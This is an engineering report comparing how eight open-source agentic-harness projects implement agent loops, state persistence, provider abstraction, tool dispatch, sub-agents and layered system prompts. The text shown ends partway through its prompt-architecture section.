# Building an Agentic Harness — A Cross-Reference Study

**Version:** 1.0
**Date:** 2026-08-23
**Sources analyzed:** 8 reference repositories under `reference/`

> An **agentic harness** is the software substrate that turns a raw LLM into an autonomous, tool-using worker: it manages the reasoning loop, tool calls, memory, sandboxing, approval, persistence, observability, and the surfaces (CLI/UI/API) through which users invoke it.

This report distills every architectural detail extracted from the eight reference repositories into a single, exhaustive engineering reference for building your own harness. It covers **what components a harness must have**, **how each reference solves them**, **which trends have hardened into de-facto standards**, and **which decisions remain open**.

---

## Table of contents

1. [Repositories at a glance](#1-repositories-at-a-glance)
2. [What is a harness? — A working definition](#2-what-is-a-harness--a-working-definition)
3. [The 15 mandatory subsystems](#3-the-15-mandatory-subsystems)
4. [Cross-repo trends and de-facto standards](#4-cross-repo-trends-and-de-facto-standards)
5. [Subsystem deep dives](#5-subsystem-deep-dives)
    1. [Language & runtime choice](#51-language--runtime-choice)
    2. [The agent loop](#52-the-agent-loop)
    3. [State, messages & persistence](#53-state-messages--persistence)
    4. [LLM provider abstraction](#54-llm-provider-abstraction)
    5. [Tool system & dispatch](#55-tool-system--dispatch)
    6. [Sub-agents & delegation](#56-sub-agents--delegation)
    7. [Prompt architecture](#57-prompt-architecture)
    8. [Memory & context management](#58-memory--context-management)
    9. [Planning](#59-planning)
    10. [Human-in-the-loop & approvals](#510-human-in-the-loop--approvals)
    11. [Sandboxing & safety](#511-sandboxing--safety)
    12. [Observability, tracing & cost](#512-observability-tracing--cost)
    13. [Configuration](#513-configuration)
    14. [Entry points & surfaces](#514-entry-points--surfaces)
    15. [Evaluation & testing](#515-evaluation--testing)
6. [Anti-patterns & recurring weaknesses](#6-anti-patterns--recurring-weaknesses)
7. [Reference architecture blueprint](#7-reference-architecture-blueprint)
8. [Decision matrix](#8-decision-matrix)
9. [Per-repo appendix](#9-per-repo-appendix)
10. [Glossary](#10-glossary)

---

## 1. Repositories at a glance

| # | Repo | Language | Domain | Distinguishing pattern |
|---|---|---|---|---|
| 1 | **visa/visa-vulnerability-agentic-harness** (VVAH) | Python 3.11+ | Autonomous SAST (vulnerability discovery + remediation) | Deterministic 11-stage pipeline (S0–S11), pydantic contracts between stages, multi-run voting, adversarial verifier |
| 2 | **langchain-ai/open-swe** | Python 3.11+ / TypeScript UI | Enterprise coding agent (Slack/Linear/GitHub triggers) | 5 LangGraph graphs, per-thread persistent sandbox, GitHub proxy for credential-less git |
| 3 | **langchain-ai/deepagents** | Python 3.11+ | General-purpose "batteries-included" harness SDK | Composable middleware stack, virtual filesystem backends, `create_deep_agent()` factory |
| 4 | **karpathy/autoresearch** | Python 3.10+ | LLM-directed neural architecture search | Not an SDK — a *target* for external agents; single-file `train.py` + `program.md` instruction doc |
| 5 | **NousResearch/hermes-agent** | Python 3.11–3.13 + TS UI | Production general-purpose agent w/ self-improving skills | Cache-safe 3-tier prompt, 7 messaging gateways, autonomous skill creation, pluggable memory providers |
| 6 | **aws-samples/bedrock-engineer** | TypeScript (Electron) | Desktop coding-agent app on Bedrock | Electron main/renderer split, PLAN/ACT dual-mode prompt, React Context state |
| 7 | **openai/codex** | Rust (100+ crates) + TS | Local coding CLI agent | Native Responses API streaming, `*** Begin Patch` format, per-OS sandbox (Landlock/Seatbelt/RestrictedToken), Guardian approval, rollout-based state |
| 8 | **aaif-goose/goose** | Rust + Electron TS UI | General-purpose local agent (CLI + desktop) | Explicit state-machine `Step[]` engine, MCP-first tool ecosystem, YAML recipes, 15+ providers |

Two of these (**autoresearch**, **VVAH**) are **domain-specific harnesses** — they wrap a specific pipeline and expose the LLM as one stage among many. The other six are **general-purpose harnesses** — they aim to turn any LLM into an autonomous worker for arbitrary tasks. Both classes matter: many production harnesses end up domain-specific after starting general.

---

## 2. What is a harness? — A working definition

Across all eight repos, a harness converges on the same essential responsibility:

> **Given (a) an LLM endpoint, (b) a set of tools, and (c) a user goal, drive a bounded, safe, observable, resumable loop until the goal is met or an escape condition triggers.**

Everything else — UIs, memory, sandboxing, subagents, planning — is scaffolding around that loop. The eight repos differ mostly in **which scaffolding they provide out of the box** and **which they push onto the user**.

A useful mental model is that a harness is the composition of three planes:

- **Control plane** — the loop, state machine, message queue, approvals, interrupts.
- **Data plane** — messages, tool results, files, memories, checkpoints, rollouts.
- **Integration plane** — LLM providers, tool servers (MCP), sandboxes, UIs, webhooks.

Every mature repo below draws this line explicitly. Every immature one blends the planes and pays for it later (see [§6](#6-anti-patterns--recurring-weaknesses)).

---

## 3. The 15 mandatory subsystems

Every general-purpose harness in this set implements **all 15** of the following. If your design is missing any, you are either scoped smaller than these projects or you have a hidden gap.

| # | Subsystem | Purpose | Skip if… |
|---|---|---|---|
| 1 | **Agent loop** | Drive iterative reason→act→observe | Never — this *is* the harness |
| 2 | **Message/state model** | Represent conversation, tool calls, results | Never |
| 3 | **Persistence / checkpoint** | Resume after crash/pause, audit | Purely stateless one-shot only |
| 4 | **Provider abstraction** | Talk to ≥1 LLM API safely | Never |
| 5 | **Tool registry & dispatch** | Turn model output into effects | Chat-only agent (rare) |
| 6 | **Prompt assembly** | Build system messages deterministically | Never |
| 7 | **Context management** | Fit under model window, compact history | Very short sessions only |
| 8 | **Memory** (short + long-term) | Persist learned facts across runs | Ephemeral only |
| 9 | **Sub-agent / delegation** | Spawn isolated workers for subtasks | Small, linear tasks only |
| 10 | **Planning / task decomposition** | Break large goals into steps | Trivial tasks only |
| 11 | **Human-in-the-loop** | Approvals, interrupts, clarify | Fully autonomous background only |
| 12 | **Sandboxing** | Prevent tool misuse from harming host | Read-only tools only |
| 13 | **Observability** (logs, traces, tokens, cost) | Debug + bill + improve | Never at scale |
| 14 | **Config** | Users pick model/tools/keys/policies | Only if hardcoded product |
| 15 | **Entry points** | CLI, HTTP, SDK, webhook, UI | Never — pick at least one |

The rest of this document walks through each of these with side-by-side patterns from the eight repos.

---

## 4. Cross-repo trends and de-facto standards

The following patterns appear in a **majority of the repos** and can be treated as safe defaults. Deviating from them is a decision, not an oversight.

### 4.1 Loop shape
- **ReAct-style tool-calling loop** is universal. The model emits `tool_calls`, the harness executes them (often in parallel), appends `role="tool"` results, and re-invokes the model until the model stops requesting tools or a recursion limit fires.  Present in every repo except autoresearch (whose "loop" is git-commit driven).
- The loop is **stateful across turns** but the *model call itself* is **stateless** — the harness sends the entire (compacted) history every time. No repo relies on server-side thread state.
- **Recursion limits** are the primary hard stop (Open SWE: `MODEL_CALL_RECURSION_LIMIT=5000`; Codex/Goose: config-driven; Hermes: budget-driven).

### 4.2 Message format
- **OpenAI Chat Completions schema** (`{role, content, tool_calls, tool_call_id}`) is the wire format in **6/8 repos** (Codex uses Responses API items; autoresearch has no messages). Even Anthropic/Bedrock backends are adapted *into* Chat-Completions-shaped internal messages before storage.
- **JSON function-calling** — not XML — is the dominant tool-call format. Hermes explicitly calls this out; Codex and Goose exposed it via Responses API + MCP. No repo builds on a custom XML grammar (Hermes model *outputs* XML in early Claude prompts, but the harness normalizes to JSON).

### 4.3 Provider abstraction
- **Multi-provider from day one is standard.** Only Bedrock Engineer is single-provider (Bedrock only). Every other harness has ≥3 (Anthropic + OpenAI + Local/Ollama at minimum), and Hermes/Goose reach 15+.
- **Provider selection is per-role, not global.** VVAH picks a different model for `deepdive` vs `verify` vs `remediate`. Open SWE picks one at session start with a fallback chain. Hermes has session-wide selection but per-config-file overrides.
- **Provider fallback chains** (retry with different provider on 5xx / 429) are present in Open SWE, Hermes, and Goose.
- **Prompt caching** (Anthropic ephemeral cache blocks; OpenAI implicit prefix cache) is exploited in VVAH, DeepAgents, Hermes, Bedrock Engineer, Open SWE. This is now a table-stakes optimization for any repeated system prompt.

### 4.4 Tools
- **MCP is the emerging standard tool protocol.** Goose is MCP-first (all tools are MCP servers, even builtins). Codex, Bedrock Engineer, Hermes, Open SWE, and DeepAgents all support MCP as one of several tool sources. Only VVAH and autoresearch have no MCP surface.
- **Built-in tools cluster into ~7 categories:** shell/exec, file r/w, patch/edit, glob/grep, web fetch/search, browser automation, delegate/task. Every general-purpose harness ships approximately this set (Hermes: 70+; Codex: 10 core + MCP; DeepAgents: 6 filesystem + shell + task; Bedrock Engineer: 25; Goose: MCP-provided; Open SWE: ~25 curated).
- **`apply_patch`-style diff-based edits are winning over blind `write_file`** for coding agents. Codex has the `*** Begin Patch / *** End Patch` format with `@@` context lines; Bedrock Engineer has `applyDiffEdit`; DeepAgents ships `edit_file(old_str, new_str)`. Full rewrites via `write_file` still exist but are secondary.
- **Parallel tool dispatch** with path-overlap safety is standard (Hermes, Open SWE, DeepAgents via LangChain, Codex). Serial fallback triggers on destructive ops (`rm`, `git push`, `apply_patch` on same file).

### 4.5 State & persistence
- **Append-only rollout/checkpoint logs** are the dominant persistence pattern. Codex writes CBOR rollouts to `~/.codex/rollouts/`; Goose writes SQLite per session; VVAH writes pydantic JSON checkpoints per stage; Hermes writes SQLite per profile; Open SWE piggybacks on LangGraph's checkpointer. No repo uses pickle (VVAH explicitly rejects it — good practice).
- **SQLite is the near-universal local store.** Goose, Hermes, VVAH, Codex, Bedrock Engineer all use SQLite/embedded stores for session and metadata. Only Open SWE offloads to LangGraph's managed backend.
- **Deterministic thread/session IDs from invocation surface** is a critical trick (Open SWE: `hash(channel_ts)`; Bedrock Engineer: UUID+timestamp; Hermes: session_id). This makes follow-ups idempotent: the same Slack thread routes to the same agent thread.
- **State survives across turns**; the sandbox does too. This is a major differentiator from stateless "one-shot" tools. Open SWE keeps one sandbox per thread and reconnects; Goose sessions are resumable; Codex resumes via rollout replay.

### 4.6 Memory
- **Two-tier memory is the norm:** short-term = in-session message list; long-term = per-user or per-repo markdown/YAML files loaded into the system prompt.
- **`AGENTS.md` is the emerging convention** for repo-scoped agent instructions. Codex, Open SWE, Hermes, Goose (`.goosehints`), and DeepAgents (`MemoryMiddleware` loading arbitrary paths) all support it. This document itself is one — write one for your repo and every modern agent will pick it up.
- **Summarization-based context compaction** appears in DeepAgents (`SummarizationMiddleware`), Codex (inline + remote compact), Goose (LLM-based compact), Hermes (context compressor). Trigger: token budget threshold; strategy: call a smaller/cheaper model to summarize older messages, evict them, keep recent N.
- **Vector-DB / RAG is optional and pluggable, not built in.** Only Bedrock Engineer has native Bedrock KB integration; Hermes has pluggable providers (Honcho, Hindsight, Mem0, Supermemory). Codex and Goose defer to MCP servers.

### 4.7 Sub-agents
- **`task` / `delegate_task` / `spawn_agent` tool** is the universal delegation primitive. DeepAgents pioneered the shape; Codex, Hermes, Open SWE, Goose all copy the pattern.
- **Isolated fresh context** for the child is the standard default. Parent sees only the child's final summary.
- **Depth cap ≤ 2 is common** (Hermes default 1, Goose 2, Codex configurable). Deeper trees are rare and hard to debug.

### 4.8 Approval & HITL
- **Three approval modes** recur: `suggest` (always ask), `auto-edit` (auto-file-write, ask-shell), `full-auto` / `auto`. Codex names these explicitly; Bedrock Engineer, Open SWE, DeepAgents implement equivalents.
- **Per-tool interrupt rules** (via LangGraph `interrupt_before` in DeepAgents, ACP elicitation in Goose, Guardian in Codex) let users approve just one class of action.
- **Draft PR + review link workflow** (Open SWE) is a powerful pattern for asynchronous approval that doesn't block the loop.

### 4.9 Sandboxing
- **OS-level sandboxes for shell execution** are the state of the art. Codex uses Seatbelt (macOS), Landlock + bwrap (Linux), RestrictedToken (Windows). No other repo goes this far — most rely on process isolation or containers.
- **Path-jail + symlink rejection** is the common file-tool safety layer (VVAH `_jail()`, DeepAgents `FilesystemPermission`, Codex path canonicalization).
- **Cloud sandbox providers as a pluggable interface**: Open SWE supports 6 (LangSmith, Modal, Daytona, Runloop, E2B, Local); DeepAgents partners package has Daytona/Modal/Vercel. This is the answer for "how do we run agents at scale without giving them our laptop."
- **Network egress control** is uneven. Codex has managed-network proxy with deferred approval; Goose has EgressInspector; most others allow arbitrary egress.

### 4.10 Prompt architecture
- **Three-tier prompt** (identity + context + volatile) is the pattern in Hermes, Open SWE, DeepAgents, Goose. The stable tier is byte-frozen to enable prompt caching; the volatile tier is rebuilt every turn.
- **Repo-scoped instruction files loaded at runtime** (AGENTS.md, `.goosehints`, `.cursorrules`, HERMES.md, `SOUL.md`) are non-negotiable for coding agents.
- **Prompt injection defense at ingest** (Hermes' `threat_patterns.py`) is a live concern — repo-loaded context files are attacker-controlled if the repo is untrusted.

### 4.11 Observability
- **LangSmith / LangFuse / OpenTelemetry** are the three major tracing backends. LangGraph-based repos default to LangSmith; Goose and Hermes emit OTLP; Codex uses OpenTelemetry. All track: TTFT, token counts (input/output/cache), tool durations, approval outcomes.
- **Token counting is a first-class metric** and is emitted per turn, per stage, per tool. Cost tracking (`cost = tokens × price_per_1k`) is usually app-side, not harness-side.

### 4.12 Entry points
- **CLI + HTTP + IDE/gateway** is the standard trio. Every mature harness has all three (Codex, Goose, Hermes, Open SWE). SDK is a bonus (DeepAgents leads here; `create_deep_agent()` is *the* SDK reference).
- **Webhook-driven multi-surface** (Slack + Linear + GitHub + Dashboard, all landing on same thread_id) is Open SWE's key insight and worth copying for team deployments.

---

## 5. Subsystem deep dives

Each subsection contains: **what the subsystem does**, **how the eight repos solve it**, and **a design cheat-sheet** for your own harness.

### 5.1 Language & runtime choice

| Repo | Core language | Rationale |
|---|---|---|
| VVAH | Python 3.11+ | Fits security tooling ecosystem; pydantic + LangGraph natural |
| Open SWE | Python (agent) + TS (UI) | Python agent for LangGraph; TS for React/Electron |
| DeepAgents | Python | LangChain/LangGraph SDK; `uv` |
| Autoresearch | Python 3.10+ | PyTorch |
| Hermes | Python 3.11–3.13 + TS UI | Python for agent, TS Electron for TUI/desktop |
| Bedrock Engineer | TS/Electron | Desktop app first, no Python |
| Codex | Rust (100+ crates) + TS shell | Perf + native binaries + sandboxing |
| Goose | Rust + TS UI | Same rationale as Codex |

**Trend:** *Rust for the core control plane once you need distributable single-binary CLIs, aggressive concurrency, and OS-level sandboxes; Python for research/experimentation and when you're going to compose LangChain/LangGraph anyway.* TypeScript wins for desktop shells and dashboards. Choose Rust if native shipping and sandbox depth matter; choose Python if speed-of-iteration and ecosystem (LangChain, pydantic, tree-sitter, deepagents) matter more.

**Design cheat-sheet:**
- Pin the runtime (`.python-version`, `rust-toolchain.toml`). All repos do.
- Use `uv` for Python (DeepAgents, Autoresearch, Hermes lean this way). It's fast, deterministic, and handles interpreter provisioning.
- Use `pnpm` workspaces for TS monorepos (Open SWE, Codex, Goose).
- Cargo workspaces with per-crate boundaries (Codex has 100+ crates for reason).

---

### 5.2 The agent loop

Every harness in this survey (except autoresearch, which is loopless-by-design) runs a variant of:

```text
LOAD state (messages, memory, cwd, session_id)
BUILD system prompt (stable + context + volatile)
LOOP until stop or recursion cap:
  CALL provider(system, messages, tools, stream=true)
  PARSE response:
    if text-only and no tool_calls: FINISH
    if tool_calls: DISPATCH tools (parallel-safe, approval-gated)
                   APPEND tool results to messages
                   CONTINUE
  APPEND assistant message
PERSIST turn (append-only), UPDATE memory, RETURN final text
```

The variations are in *how the loop is structured in code*:

| Repo | Loop implementation |
|---|---|
| VVAH | **Not a loop — a linear stage orchestrator.** `scan_repo()` walks stages S0…S11 in order; within a stage there may be a bounded loop (S4 voting runs) but there is no unbounded ReAct loop. Each stage is one LLM call, or agentic with its own bounded tool loop. |
| Open SWE | **LangGraph state graph.** `create_deep_agent()` builds a compiled `StateGraph`; execution driven by LangGraph runtime with middleware pre/post hooks. |
| DeepAgents | **LangGraph + middleware stack** (see §5.2 code block below). |
| Autoresearch | **No agent loop.** External LLM (Claude Code / Codex) reads `program.md` and edits `train.py`; the "loop" is git commit + `uv run train.py`. |
| Hermes | **Hand-rolled while-loop in `conversation_loop.py` (~3900 LOC).** Explicit steps: pre-sample compaction, build request, stream, dispatch tools, post-turn flush. |
| Bedrock Engineer | **Streaming generator in main process.** `for await (chunk of streamChatCompletion)` produces text/tool blocks; renderer consumes. |
| Codex | **`Session::run_turn()` in Rust.** Explicit sampling loop; parses Responses API items into `ResponseInputItem`s; dispatches via `ToolRouter`; escalates sandbox on denial. |
| Goose | **Explicit state machine.** `StateMachine::step()` walks an ordered `Step[]` (Recipe, Skill, SlashCommand, Steer, Inference, ToolExecution, ToolApproval, Compaction, MaxTurns, StopHook, …). Each step returns `NotApplicable` or `Applied(effects)`. Loop yields to client when `yield_to_client == true`. |

**Middleware stack (DeepAgents, in the order they wrap):**

```text
1. SkillsMiddleware              (progressive skill loading)
2. FilesystemMiddleware          (virtual FS backend)
3. SubAgentMiddleware            (task tool)
4. SummarizationMiddleware       (token-budget compaction)
5. PatchToolCallsMiddleware      (fix dangling tool calls)
6. AsyncSubAgentMiddleware       (remote subagents via Agent Protocol)
7. [USER MIDDLEWARE]
8. Profile.extra_middleware       (model-specific tuning)
9. _ToolExclusionMiddleware      (hide tools per profile)
10. AnthropicPromptCachingMiddleware  (always, no-ops elsewhere)
11. BedrockPromptCachingMiddleware
12. FireworksPromptCachingMiddleware
13. MemoryMiddleware             (load AGENTS.md, etc.)
14. HumanInTheLoopMiddleware     (interrupt_on rules)
```

**Design cheat-sheet:**
- **Prefer a middleware stack or explicit `Step[]` engine over a monolithic function.** Goose's state machine and DeepAgents' middleware are the two mature patterns. Both make it easy to insert/reorder behaviors without touching the core loop.
- **Always cap recursion** (`max_iterations`, `MODEL_CALL_RECURSION_LIMIT`, `max_turns`). Every repo does; failing to do so is how bills get run up.
- **Distinguish `yield_to_client` from `stop`**. Goose does this explicitly: some steps pause and return to UI (approval), others end the turn.
- **Never rewrite history mid-loop** for prompt-cache reasons (Hermes calls this out).

---

### 5.3 State, messages & persistence

**Message model — the common core:**

```jsonc
{
  "role": "user | assistant | system | tool",
  "content": "string | ContentBlock[]",
  "tool_calls": [{"id": "call_1", "function": {"name": "shell", "arguments": "{...}"}}],
  "tool_call_id": "call_1",
  // Harness-internal extensions:
  "timestamp": 1734024000,
  "display_kind": "hidden | user | debug",
  "_db_persisted": true,
  "metadata": {...}
}
```

**Where state lives:**

| Repo | Session store | Format |
|---|---|---|
| VVAH | SQLite `~/.vvaharness/vvaharness.db` — per-run `checkpoints` table | Pydantic `TypeAdapter.dump_json()` bytes (no pickle) |
| Open SWE | LangGraph store + thread metadata + `refs/open-swe/turns/<id>` git refs | LangChain BaseMessage list |
| DeepAgents | LangGraph checkpointer (`DeltaChannel` reducer) | Message list; **O(N) not O(N²) checkpoint growth** via delta reducer |
| Autoresearch | Git commits + `results.tsv` (agent-appended, not committed) | Diff-per-commit; TSV per experiment |
| Hermes | SQLite `~/.hermes/state.db` — `conversations`, `messages`, `memory_bank` | JSON columns |
| Bedrock Engineer | JSON files per session in `~/.bedrock-engineer/chat-sessions/{id}.json`; Electron Store for meta | Full history rewritten each save |
| Codex | SQLite `~/.codex/state.db` + append-only `rollouts/` | CBOR + JSON envelopes; resume via `ThreadStore::resume_thread()` |
| Goose | Per-session SQLite in `~/.local/share/goose/sessions/{id}.db` | Rows per message, JSON columns |

**Key design decisions repeatedly made:**

1. **Append-only over rewrite.** Every mature repo appends; only Bedrock Engineer rewrites full JSON per turn (and admits it's fragile).
2. **Deterministic session IDs** so the same invocation surface (Slack thread, PR number) routes back to the same agent. Open SWE derives from `(channel_id, ts)`; Goose accepts UUID or timestamp; Hermes hashes user_id+platform+seed.
3. **Never persist ephemeral scaffolds.** Hermes and Codex both have "internal turn shims" (empty-recovery nudges, verification prompts) that must not survive to the next turn. Both mark them with fields (`_empty_recovery_synthetic`, `_dropped_toolcall_nudge`) and strip on flush.
4. **DeltaChannel-style checkpoint reducers** (DeepAgents) prevent O(N²) explosion of checkpoint storage in long sessions. If you use LangGraph, adopt this.
5. **Rollout replay for resume** (Codex). Sessions are reconstructed by replaying the append-only log rather than storing snapshots. Cheaper writes; slower reads on resume; auditable by default.

**Design cheat-sheet:**
- Use **SQLite** for local state. It's universal, ACID, embedded, and every repo agrees.
- Use **pydantic (Python)** / **serde+schemars (Rust)** contracts for every state object. VVAH is the model here: crash-proof coercers (`_coerce_confidence`) map off-schema LLM output to safe defaults instead of dropping data.
- Store **turn diffs as git refs** (Open SWE) if you edit source files — you get zero-cost changed-file listings for the UI.
- **Never use pickle.** VVAH explicitly rejects it; every mature repo agrees.

---

### 5.4 LLM provider abstraction

| Repo | # Providers | Provider trait / abstraction | Notable |
|---|---|---|---|
| VVAH | 4 backends × N models | `_BACKENDS = {"cli", "sdk", "openai", "deepagents"}` dispatcher on `via:` field | Per-stage model routing in YAML: `deepdive: {id: claude-opus-4-6, via: sdk, temperature: 1.0}` |
| Open SWE | 4+ + Gateway | `init_chat_model("provider:model")` via LangChain; `ModelFallbackMiddleware` | LLM Gateway routing when `LANGSMITH_GATEWAY_ENABLED` |
| DeepAgents | 4 built-in + optional | `resolve_model()` + provider/harness profiles | Registry pattern: `@register_harness_profile("anthropic:claude-sonnet-4-6")` |
| Autoresearch | N/A | Model is external (Claude/Codex reading `program.md`) | The harness *is* the model's editing target |
| Hermes | 15+ | Provider-agnostic OpenAI-wire format + per-provider adapters | Lazy SDK loading via `tools/lazy_deps.py`; Codex Responses API for GPT-5 |
| Bedrock Engineer | 1 (Bedrock) | Bedrock SDK direct | Cross-region failover on throttling |
| Codex | 2+ | `ModelProvider` trait: `info()`, `capabilities()`, `approval_review_model()`, `memory_extraction_model()` | Provider chooses which model does its own approval review + memory extraction |
| Goose | 15+ | `Provider` trait — `create_streaming_request()`, `list_models()`, `get_thinking_effort_support()`, `default_permission_routing()` | Declarative provider YAMLs make new providers 20 lines of config |

**Key patterns:**

1. **Per-role model selection.** VVAH is the extreme: 8 different roles (autoexclude, preprocess, threatmodel, decompose, deepdive, verify, dedup, chain) each with independent model config. Goose has `approval_review_model()`, `memory_extraction_model()` on the provider trait. This lets you use a cheap fast model for classification and an expensive slow one for reasoning.
2. **Fallback chains.** Both cross-provider (Open SWE's Anthropic↔OpenAI fallback) and same-provider (Hermes' credential-pool rotation on 429). Rate-limit cooldown ≠ error cooldown.
3. **Prompt caching is provider-specific and worth exploiting.** Anthropic's `cache_control: {type: "ephemeral"}` on system blocks yields ~10% cost saves in VVAH's S4 stage (repeated N-run voting). DeepAgents ships `AnthropicPromptCachingMiddleware`, `BedrockPromptCachingMiddleware`, `FireworksPromptCachingMiddleware` — all no-ops when the target model doesn't support caching, which is the right defensive default.
4. **Streaming is mandatory** for interactive UIs, even if you also buffer. All eight repos support it.
5. **Reasoning-model handling.** SDK backend "drops temperature for models that reject it" (VVAH). Open SWE has effort levels (`none`|`low`|`medium`|`high`|`xhigh`|`max`). Bedrock Engineer has explicit thinking-mode toggle. Codex passes `reasoning_effort` transparently. If you support o1/o3/o4/thinking-Claude, plan for it up front.

**Design cheat-sheet:**
- Model config is a **struct**, not a string. `{id, provider, temperature, max_tokens, effort, thinking_budget, cache_control}`.
- Provider registration should be **declarative** (Goose) not code-only (VVAH). Adding a new endpoint should be a YAML file.
- Support **at least 3 providers** from day one so your abstractions are honest. Adding the 4th is 10× easier than adding the 2nd.
- **Adapter layer normalizes to OpenAI wire format internally**, then converts back at egress. Every polyglot harness does this.

---

### 5.5 Tool system & dispatch

**How tools are defined:**

| Repo | Definition style |
|---|---|
| VVAH | Not-quite-tools — stages call `backends.llm.prompt()` or `.agentic()`. Tools inside `agentic()` come from Claude CLI (`Bash/Read/Glob/Grep`) or hand-implemented in Python (`localtools.py`). |
| Open SWE | Python functions imported into `agent/tools/__init__.py`; LangChain auto-derives schema. |
| DeepAgents | `@tool` decorator, `StructuredTool`, or dict-with-JSON-schema. Middleware injects filesystem/task/subagent tools automatically. |
| Autoresearch | No tools. |
| Hermes | Self-registering modules: each `tools/foo_tool.py` calls `registry.register(name, description, parameters, handler, toolsets, check_fn)` at import time. AST scanner caches discovery. |
| Bedrock Engineer | TypeScript `BaseTool<Input, Output>` class + static `toolSpec` (Bedrock JSON schema). |
| Codex | `CoreToolRuntime` trait + `ToolSpec` (JSON schema); MCP tools discovered from servers at session start. Router matches by `tool_name`. |
| Goose | **Everything is MCP.** Even builtins (`autovisualiser`, `computercontroller`, `memory`, `tutorial`) are MCP servers. Tools named `extension__tool` (e.g., `developer__shell`). |

**Common built-in tool families (universal across coding-agent harnesses):**

- **Shell/exec:** `bash`, `execute`, `shell`, `terminal`, `executeCommand`, `background_execute`
- **File I/O:** `read_file`, `write_file`, `edit_file`, `apply_patch`, `applyDiffEdit`, `readFiles`, `writeToFile`
- **Discovery:** `ls`, `glob`, `grep`, `search_files`, `list_files`
- **Web:** `web_search` (Tavily / Exa / Firecrawl / Parallel Web), `fetch_url`, `http_request`, `fetchWebsite`
- **Vision/image:** `view_image`, `recognizeImage`, `generateImage`, `screenshot`
- **Delegation:** `task`, `delegate_task`, `spawn_agent`
- **Planning:** `enter_plan_mode`, `save_plan`, `approve_plan`, `plan`, `todo`
- **Communication (org agents):** `slack_thread_reply`, `linear_comment`, `open_pull_request`, `discord_*`
- **Memory:** `memory` tool families

**`apply_patch` — the emerging edit format:**

Codex ships the canonical version:

```text
*** Begin Patch
*** Update File: src/main.rs
@@ fn main() {
- println!("hello");
+ println!("hello, world!");
  }
*** End Patch
```

Supported hunks: `*** Add File:`, `*** Delete File:`, `*** Update File:` (with optional `*** Move to:`). Chunks anchor on `@@ context_line` markers; `+` adds, `-` removes, ` ` context. Streaming-parseable so the model can emit incrementally. DeepAgents' `edit_file(path, old_str, new_str)` and Bedrock Engineer's `applyDiffEdit` are lightweight variants of the same idea.

**Why this beats `write_file(entire_new_contents)`:**
- Model doesn't have to re-emit unchanged code (huge token savings).
- Local edits stay local — no risk of dropping unrelated code.
- Reviewable: `git diff` of the patch = literal what the model proposed.

**Tool dispatch — parallel-safe execution:**

Hermes' rule (`_should_parallelize_tool_batch` in `agent/tool_dispatch_helpers.py`):

1. Compute path overlap across calls.
2. If any two calls touch the same file path → serialize.
3. If any call is destructive (`rm`, `git push`, `apply_patch` on same file) → serialize even if disjoint.
4. Otherwise → up to 8 concurrent workers.
5. Approvals always serialize (can't approve two in parallel from one modal).

Open SWE, DeepAgents, and Codex use the same pattern.

**Design cheat-sheet:**
- **Ship `apply_patch`, not just `write_file`.** Codex's format is public and works well.
- **MCP is the safe long-term bet for external tools.** Even if you don't consume MCP servers today, expose your builtins in a way that could be re-implemented as one.
- **Redact tool results before re-injection** (VVAH `redact_counts()`). Secrets grep'd out of a file should not survive back into model context.
- **Cap tool result size** (Hermes: 100 KB spillover to disk with `<persisted-output>path</persisted-output>` marker; VVAH: `_MAX_BYTES = 200_000`). Otherwise a `git log` blows the context window.
- **Discovery cache** (Hermes) so you don't AST-parse every tool file on cold start.

---

### 5.6 Sub-agents & delegation

The `task` / `delegate_task` / `spawn_agent` tool is the dominant delegation primitive. Its shape is remarkably consistent:

```jsonc
{
  "name": "task",
  "description": "Delegate a subtask to an isolated subagent.",
  "parameters": {
    "subagent_name": "string",         // one of: general_purpose, researcher, ...
    "task_description": "string",       // freeform goal for the child
    "context": "string (optional)",     // extra context (parent's summary)
    "parallelism": "int (optional)"     // Hermes only
  }
}
```

**Isolation model:**

| Repo | Child sees parent history? | Fork mode |
|---|---|---|
| DeepAgents | No — fresh context; inherits tools/permissions unless overridden | Declarative `SubAgent` TypedDict + `CompiledSubAgent` + `AsyncSubAgent` (remote via Agent Protocol) |
| Open SWE | No — fresh context; shares sandbox worktree | Deep Agents' `task` tool |
| Hermes | No — fresh conversation, no parent history; toolset = parent minus `[delegate_task, clarify, memory, send_message, cronjob]`; auto-deny approval by default | Depth cap default 1; `delegation.max_spawn_depth` config |
| Codex | Configurable: `FullHistory` clones all; `LastNTurns(n)` truncates | `AgentControl::spawn_from_parent()`; per-session `AgentRegistry`; DAG tracked in `codex-agent-graph-store` |
| Goose | No — fresh session; distinct `subagent_system.md` prompt | `SessionExecutionMode::SubTask { parent: session_id }`; depth cap 2 |
| Bedrock Engineer | Yes (session-based) — via `invokeBedrockAgent` tool | Sibling agents, message-passing |

**Convergent design:**
1. **Fresh conversation, parent-blocking** — while child runs, parent is paused. (Async subagents in DeepAgents are the exception, and they're explicitly labelled.)
2. **Child sees the task description + a summary of parent context**, not the raw parent history.
3. **Result-only propagation**: child returns a summary string (or structured `response_format`), which parent sees as a normal `tool` message.
4. **Shared worktree, isolated conversation** (Open SWE, Goose). The child can read files the parent wrote but not the parent's messages.
5. **Auto-deny approval defaults** for subagents (Hermes). Otherwise you get infinite dangerous-action delegation.

**Design cheat-sheet:**
- **Cap depth at 2** unless you have a strong reason. Every mature repo does. Deeper trees have quadratic debugging cost.
- **Provide fork modes** (`fresh` | `last_n_turns` | `full_history` — Codex's model). Users need all three for different tasks.
- **Track parent→child in a DAG** (Codex `agent-graph-store`) so you can render a tree in the UI.
- **Structured response format for children** (DeepAgents `response_format=MyModel`) beats string parsing.

---

### 5.7 Prompt architecture

**The three-tier prompt is the dominant pattern** (Hermes, DeepAgents, Open SWE, Goose):

```text
TIER 1 — STABLE (byte-frozen for the session; enables prompt cache)
  ├── Identity ("You are Codex..." / "You are Hermes Agent..." / "You are Goose...")
  ├── Tool guidance ("Here is how to use your tools: ...")
  ├── Environment (OS, shell, cwd, tool availability)
  ├── Platform hints (CLI/Slack/Telegram/…)
  └── Coding conventions

TIER 2 — CONTEXT (mutable but long-lived; changes per session, not per turn)
  ├── User-supplied system message
  ├── Repo-scoped instruction files (AGENTS.md, .goosehints, .cursorrules, HERMES.md)
  ├── Project structure snapshot
  └── User profile (USER.md, SOUL.md)

TIER 3 — VOLATILE (rebuilt every turn)
  ├── Skills index (available skill names + short descriptions)
  ├── Memory snapshot (recent facts)
  ├── Todo state
  └── Timestamp / session_id / model info
```

**Prompt storage patterns:**

- **Embedded `.md` templates + Jinja2/minijinja** — Goose (`prompts/*.md`, minijinja), Codex (`codex-rs/prompts/templates/`, `include_str!`), Open SWE (`agent/prompt.py` with dedicated section builders).
